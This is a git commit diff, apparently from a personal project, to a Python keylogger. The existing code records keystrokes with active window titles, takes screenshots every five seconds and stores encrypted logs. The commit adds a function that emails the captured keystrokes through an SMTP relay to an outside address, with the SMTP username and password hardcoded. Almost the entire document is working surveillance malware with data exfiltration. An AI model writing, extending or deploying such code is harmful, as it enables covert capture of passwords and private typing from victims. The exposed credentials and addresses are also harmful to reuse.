e8fe7b79115ca6b2f969c17d23232bc56281cded
aleyna demir <alyndemr6@gmail.com>
2024-06-11 19:52:29 +0300

    added email sending feature

--- keylogger.py
+++ keylogger.py
@@ -8,24 +8,37 @@ from threading import Timer, Lock
 from key_manager import load_key
 from database import insert_log, insert_screenshot
 import pygetwindow as gw
+import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
 
-#anahtar
+
+# mailtrap SMTP ayarları
+SMTP_SERVER = 'smtp.mailtrap.io'
+SMTP_PORT = 587
+SMTP_USERNAME = '53c9f3f068373e'  # mailtrap kullanıcı adı
+SMTP_PASSWORD = '656572f97baa7c'  # mailtrap şifre
+FROM_EMAIL = 'deneme921@gmail.com'
+TO_EMAIL = 'alyndemr6@gmail.com'
+
+# anahtar
 key = load_key()
 f = Fernet(key)
 
 
 log_dir = os.path.expanduser('~') + "/PycharmProjects/pythonProject/keylogger/"
+screenshot_dir = log_dir + "screenshots/"
 os.makedirs(log_dir, exist_ok=True)
+os.makedirs(screenshot_dir, exist_ok=True)
+
 encrypted_log_file = log_dir + "e_log.txt"
 keys = []
 lock = Lock()
 
 current_window = "Unknown"
 
-
 def encrypt_content(content):
     return f.encrypt(content.encode('utf-8'))
-
 
 def update_active_window_title():
     global current_window
@@ -34,16 +47,13 @@ def update_active_window_title():
         current_window = window.title
     else:
         current_window = "Unknown"
-    # 20 saniye
-    Timer(20, update_active_window_title).start()
-
+    Timer(5, update_active_window_title).start()
 
 def on_press(key):
     with lock:
         keys.append((key, current_window))
         if len(keys) >= 50:  # 50 harf
             write_file()
-
 
 def write_file():
     with lock:
@@ -65,36 +75,55 @@ def write_file():
                     log_content += k
 
             try:
-
                 encrypted_content = encrypt_content(log_content)
                 with open(encrypted_log_file, "ab") as file:
                     file.write(encrypted_content + b'|')
                     file.flush()
-                # veritabanı
+                # Veritabanı
                 insert_log(log_content)
+
+                # e-posta gönderme
+                send_email('Keylogger Report',
+                           log_content)
             except Exception as e:
-                print(f"Error writing to log file: {e}")
+                print(f"error writing process: {e}")
             finally:
                 keys.clear()
-
 
 def take_screenshot():
     try:
         screenshot = ImageGrab.grab()
-        screenshot_path = f'{log_dir}screenshot_{int(time.time())}.png'
+        screenshot_path = f'{screenshot_dir}screenshot_{int(time.time())}.png'
         screenshot.save(screenshot_path)
-        # veritabanı
+        # Veritabanı
         insert_screenshot(screenshot_path)
     except Exception as e:
-        print(f"Error taking screenshot: {e}")
+        print(f"error taking screenshot: {e}")
 
+def send_email(subject, body):
+    try:
+        msg = MIMEMultipart()
+        msg['From'] = FROM_EMAIL
+        msg['To'] = TO_EMAIL
+        msg['Subject'] = subject
+
+        msg.attach(MIMEText(body))
+
+        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
+        server.starttls()
+        server.login(SMTP_USERNAME, SMTP_PASSWORD)
+        text = msg.as_string()
+        server.sendmail(FROM_EMAIL, TO_EMAIL, text)
+        server.quit()
+
+        print("Email sent successfully!")
+    except Exception as e:
+        print(f"Error sending email: {e}")
 
 def job():
     write_file()
     take_screenshot()
-    # 5 saniye
     Timer(5, job).start()
-
 
 with Listener(on_press=on_press) as listener:
     Timer(5, job).start()
